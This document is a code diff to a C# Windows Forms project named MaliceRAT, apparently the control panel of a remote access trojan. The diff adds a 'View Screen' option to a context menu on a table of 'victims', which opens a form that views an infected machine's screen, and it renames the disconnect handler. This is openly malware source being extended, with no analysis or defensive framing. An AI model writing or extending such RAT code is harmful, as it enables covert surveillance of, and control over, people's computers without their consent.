@@ -7,6 +7,7 @@ using Microsoft.CSharp;
 using System.Threading.Tasks;
 using System.Drawing;
 using MaliceRAT.RatServer;
+using MaliceRAT.RatUI;
 
 namespace MaliceRAT
 {
@@ -66,7 +67,9 @@ namespace MaliceRAT
                     "System.Memory.dll",
                     "Microsoft.CSharp.dll",
                     "System.Runtime.dll",
-                    "System.Runtime.CompilerServices.Unsafe.dll"
+                    "System.Runtime.CompilerServices.Unsafe.dll",
+                    "System.Drawing.dll",
+                    "System.Windows.Forms.dll"
                 }
             };
 
@@ -79,6 +82,7 @@ namespace MaliceRAT
                     errorMessage += $"\nLine {error.Line}, Column {error.Column}: {error.ErrorText}";
                 }
                 
+                Console.WriteLine(errorMessage);
                 MessageBox.Show(errorMessage);
 
                 return null;
@@ -190,9 +194,10 @@ namespace MaliceRAT
         {
             ContextMenuStrip victimContextMenu = new ContextMenuStrip();
 
-            ToolStripMenuItem Item1 = ContextMenuUtilities.CreateContextMenuItem("Disconnect", (sender, e) => Item1_Click(sender, e, gunaVictimsTable));
+            ToolStripMenuItem viewScreenItem = ContextMenuUtilities.CreateContextMenuItem("View Screen", ViewScreen_Click);
+            ToolStripMenuItem disconnectItem = ContextMenuUtilities.CreateContextMenuItem("Disconnect", (sender, e) => Disconnect_Click(sender, e, gunaVictimsTable));
             
-            victimContextMenu.Items.Add(Item1);
+            victimContextMenu.Items.AddRange(new ToolStripItem[] { viewScreenItem, disconnectItem });
 
             gunaVictimsTable.ContextMenuStrip = victimContextMenu;
             gunaVictimsTable.MouseDown += (sender, e) => ContextMenuUtilities.GunaVictimsTable_MouseDown(sender, e, gunaVictimsTable);
@@ -213,7 +218,24 @@ namespace MaliceRAT
             }
             return null;
         }
-        private void Item1_Click(object sender, EventArgs e, DataGridView gunaVictimsTable)
+        private void Disconnect_Click(object sender, EventArgs e, DataGridView gunaVictimsTable)
+        {
+            var id = GetSelectedId(gunaVictimsTable);
+            if (id.HasValue)
+            {
+                server.DisconnectClient(id.Value);
+            }
+        }
+        private void ViewScreen_Click(object sender, EventArgs e)
+        {
+            var id = GetSelectedId(gunaVictimsTable);
+            if (id.HasValue)
+            {
+                ScreenViewForm screenViewForm = new ScreenViewForm(id.Value, server);
+                screenViewForm.Show();
+            }
+        }
+        private void Disconnect_Click(object sender, EventArgs e)
         {
             var id = GetSelectedId(gunaVictimsTable);
             if (id.HasValue)
